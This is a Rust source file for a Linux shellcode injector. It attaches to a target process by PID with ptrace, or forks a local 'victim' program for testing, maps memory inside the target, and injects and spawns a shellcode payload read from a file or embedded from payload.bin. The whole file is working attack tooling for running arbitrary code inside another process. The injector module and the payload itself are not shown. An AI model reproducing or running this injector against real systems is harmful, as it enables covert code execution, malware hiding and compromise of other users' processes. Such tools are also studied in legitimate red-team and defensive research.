pub mod injector;

use injector::Injector;

use std::io;
use nix::sys::wait::wait;
use std::process::{Command, exit};
use std::os::unix::process::CommandExt;
use nix::sys::ptrace;
use nix::unistd::{Pid, ForkResult, fork};
use nix::sys::signal::Signal;
use nix::sys::ptrace::Options;

use clap::{Parser, ArgAction};
use std::ffi::OsString;
use std::fs;

/// Send TRACEME to the parent and run the target program prog
fn run_child(prog: &str) {
    ptrace::traceme().unwrap();

    println!("running program: {}", prog);
    Command::new(prog).exec();

    exit(0);
}

/// Wait for the the TRACEME from the child process pid to continue 
fn run_parent(pid: Pid) {
    wait().unwrap();

    let payload = include_bytes!("../rsrc/payload.bin");

    let mut injector = Injector::new(pid);
    injector.run_mmap().unwrap();
    injector.inject_payload_and_spawn(payload).unwrap();

    ptrace::detach(injector.pid, None).unwrap();

}



/// Fork the current process and run the child and parent functions
fn fork_proc(victim_prog: &str) {

    println!("forking process {}", victim_prog);
    match unsafe{fork()} {
        Ok(ForkResult::Child) => {
            run_child(victim_prog);
        }
        Ok(ForkResult::Parent {child}) => {
            run_parent(child);
        }
        Err(err) => panic!("fork has failed: {}", err),
    };

}


#[derive(Parser, Debug)]
struct Args {

    /// Pid of the target process to inject into
    #[arg(short, long, default_value_t = 0)]
    pid: i32,

    /// shellcode bin file to inject
    #[arg(short, long, default_value = "./shellcode.bin")]
    shellcode: OsString,

    /// fork for testing
    #[arg(short, long, action=ArgAction::SetTrue)]
    fork: bool,

}



fn main() -> io::Result<()> {


    let args = Args::parse();

    if args.fork {
        fork_proc("./victim/target/debug/victim");
    } else {

        let pid = Pid::from_raw(args.pid);
        let payload = fs::read(args.shellcode).unwrap();

        let mut injector = Injector::new(pid);
        injector.attach_pid().unwrap();
        injector.run_mmap().unwrap();
        injector.inject_payload_and_spawn(&payload).unwrap();

    }


    Ok(())
}
